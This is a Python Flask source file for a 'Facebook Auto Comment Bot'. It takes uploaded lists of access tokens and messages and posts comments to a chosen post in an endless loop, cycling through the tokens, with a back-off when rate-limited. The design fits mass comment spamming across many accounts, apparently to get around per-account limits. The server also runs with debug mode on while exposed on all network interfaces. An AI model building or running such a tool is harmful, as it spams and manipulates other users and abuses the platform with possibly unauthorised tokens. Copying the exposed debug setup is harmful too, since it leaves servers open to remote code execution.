# main.py
import os
import time
import random
import string
from threading import Thread, Event
from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)
app.debug = True

tasks = {}
threads = {}

def send_comments(access_tokens, post_id, time_interval, messages, task_id):
    stop_event = tasks[task_id]["stop"]
    msg_index = 0
    token_index = 0

    while not stop_event.is_set():
        try:
            if not access_tokens or not messages:
                print("⚠️ No tokens or messages")
                break

            current_message = messages[msg_index]
            current_token = access_tokens[token_index]

            api_url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
            params = {
                "access_token": current_token,
                "message": current_message
            }

            response = requests.post(api_url, data=params, timeout=10)
            if response.status_code == 200:
                print(f"[{task_id}] ✅ Comment Sent: {current_message}")
            else:
                print(f"[{task_id}] ❌ Failed {response.status_code}: {response.text}")
                if response.status_code == 429:
                    time.sleep(60)

        except Exception as e:
            print(f"[{task_id}] ⚠️ Error: {e}")
            time.sleep(5)

        time.sleep(time_interval)
        msg_index = (msg_index + 1) % len(messages)
        token_index = (token_index + 1) % len(access_tokens)


# ---------- UI ----------
INDEX_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>FB Comment Bot</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background: linear-gradient(135deg,#0f172a,#0ea5e9); color:#e6eef8; }
    .card { border-radius: 14px; background: #fff; color:#042a48; box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
  </style>
</head>
<body>
<div class="container py-4">
  <div class="row justify-content-center">
    <div class="col-md-7">
      <div class="card p-4">
        <h3 class="text-center mb-3">Facebook Auto Comment Bot</h3>
        <form method="post" enctype="multipart/form-data">
          <div class="mb-3">
            <label>Single Token</label>
            <input type="text" name="singleToken" class="form-control" placeholder="EAAG..." >
            <div class="form-text">OR upload a token file</div>
            <input type="file" name="tokenFile" class="form-control mt-2">
          </div>
          <div class="mb-3">
            <label>Post ID</label>
            <input type="text" name="postId" class="form-control" required>
          </div>
          <div class="mb-3">
            <label>Time Delay (seconds)</label>
            <input type="number" name="time" class="form-control" value="10" required>
          </div>
          <div class="mb-3">
            <label>Messages File (.txt)</label>
            <input type="file" name="txtFile" class="form-control" required>
          </div>
          <button class="btn btn-primary w-100">Start Bot</button>
        </form>
        <hr>
        <form method="post" action="/stop">
          <label>Stop Task ID</label>
          <input type="text" name="taskId" class="form-control mb-2">
          <button class="btn btn-danger w-100">Stop</button>
        </form>
        <hr>
        <a href="/status" class="btn btn-secondary w-100">Check Active Tasks</a>
      </div>
    </div>
  </div>
</div>
</body>
</html>
"""


@app.route("/", methods=["GET","POST"])
def index():
    if request.method=="POST":
        tokens=[]
        single = request.form.get("singleToken","").strip()
        if single:
            tokens=[single]
        else:
            tf=request.files.get("tokenFile")
            if tf:
                tokens=tf.read().decode().splitlines()
        if not tokens: return "❌ No token provided",400

        post_id=request.form.get("postId","").strip()
        try:
            interval=int(request.form.get("time","10"))
        except: interval=10

        txt=request.files.get("txtFile")
        if not txt: return "❌ No messages file",400
        messages=[m.strip() for m in txt.read().decode().splitlines() if m.strip()]

        task_id=os.urandom(4).hex()
        stop_event=Event()
        tasks[task_id]={"stop":stop_event}
        t=Thread(target=send_comments,args=(tokens,post_id,interval,messages,task_id))
        t.daemon=False
        t.start()
        tasks[task_id]["thread"]=t
        return f"✅ Task started with ID: {task_id}"

    return render_template_string(INDEX_HTML)

@app.route("/stop",methods=["POST"])
def stop():
    tid=request.form.get("taskId","").strip()
    if tid in tasks:
        tasks[tid]["stop"].set()
        return f"🛑 Stopped {tid}"
    return "No such task",404

@app.route("/status")
def status():
    out={}
    for k,v in tasks.items():
        alive=v["thread"].is_alive() if "thread" in v else False
        out[k]={"alive":alive}
    return out

if __name__=="__main__":
    port=int(os.environ.get("PORT",5000))
    app.run(host="0.0.0.0",port=port)
